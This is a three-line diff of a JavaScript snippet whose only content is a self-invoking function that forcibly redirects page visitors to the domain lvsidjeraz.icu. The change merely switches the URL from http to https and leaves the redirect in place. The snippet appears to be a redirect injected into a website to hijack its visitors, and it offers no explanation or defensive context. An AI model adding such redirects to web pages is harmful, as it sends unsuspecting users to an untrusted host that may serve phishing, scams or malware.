@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'http://lvsidjeraz.icu/';
+    window['location'] = 'https://lvsidjeraz.icu/';
 })();
